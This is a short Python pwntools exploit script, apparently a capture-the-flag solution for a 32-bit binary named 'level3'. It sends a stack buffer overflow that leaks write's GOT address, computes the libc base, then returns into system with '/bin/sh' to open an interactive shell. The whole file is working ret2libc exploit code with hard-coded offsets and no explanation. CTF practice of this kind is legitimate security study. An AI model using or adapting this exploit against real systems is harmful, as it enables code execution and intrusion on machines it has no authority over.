from pwn import *
#h,p = '111.200.241.244',54787
#p = remote(h,p)

p = process("./level3")
#gdb.attach("level3","b *0x0804847e")

#system_offset = 0x0003a940
#write_offset = 0x00d43c0
#sh_offset = 1413163

write_offset = 0x00e56f0 #localtest
system_offset = 0x003ce10 #localtest
sh_offset = 0x17b88f #localtest

write_plt = 0x8048340
write_got = 0x804a018
main = 0x08048484

exp = "A"*0x88+"BBBB"+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
p.sendlineafter("Input:\n",exp)

write_addr = u32(p.recv(4))
libc_base = write_addr-write_offset

print "write address: ", hex(write_addr)
print "Libc base address: ", hex(libc_base)
exp = "A"*0x88+"BBBB"+p32(system_offset+libc_base)+"AAAA"+p32(sh_offset+libc_base)
p.sendlineafter("Input:\n",exp)
p.interactive()
